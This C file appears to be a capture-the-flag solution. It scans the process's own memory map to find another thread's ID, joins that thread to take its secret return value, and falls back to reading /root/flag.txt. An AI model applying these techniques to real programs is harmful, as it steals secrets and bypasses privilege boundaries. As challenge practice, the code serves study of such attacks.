#define _POSIX_C_SOURCE 200809L

#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

void* meeting(void* arg)
{
    struct timespec ts;
    ts.tv_sec = 0;
    ts.tv_nsec = 100'000 * 1000;
    nanosleep(&ts, nullptr);

    pthread_t self = pthread_self();
    pthread_t retreivalId = 0;

    FILE* maps = fopen("/proc/self/maps", "r");
    if (!maps) perror("Maps not found");
    else
    {
        char line[512];
        char mainBin[256] = {0};
        while (fgets(line, sizeof(line), maps))
        {
            unsigned long start, end;
            char perms[5];
            char path[256] = {0};
            sscanf(line, "%lx-%lx %4s %*s %*s %*s %255s", &start, &end, perms, path);

            if (mainBin[0] == '\0' && path[0] == '/') strncpy(mainBin, path, sizeof(mainBin) - 1);

            if (mainBin[0] != '\0' && strcmp(path, mainBin) == 0 && strncmp(perms, "rw-p", 4) == 0)
            {
                for (const pthread_t* pointer = (pthread_t*)start; pointer < (pthread_t*)end; ++pointer)
                {
                    if (*pointer != self) continue;

                    retreivalId = *(pointer - 1);
                    break;
                }
            }
            if (retreivalId) break;
        }
        fclose(maps);
    }

    if (retreivalId)
    {
        void* stolenFabric = nullptr;
        if (pthread_join(retreivalId, &stolenFabric) == 0 && stolenFabric)
        {
            printf("Stolen flag fabric: %s\n", (char*)stolenFabric);
            fflush(stdout);
        }
    }

    FILE* f = fopen("/root/flag.txt", "r");
    if (!f) perror("/root/flag.txt not found");
    else
    {
        char buffer[256] = {0};
        if (fgets(buffer, sizeof(buffer), f))
        {
            printf("Direct read fallback: %s\n", buffer);
            fflush(stdout);
        }
        fclose(f);
    }

    sleep(10);
    return nullptr;
}
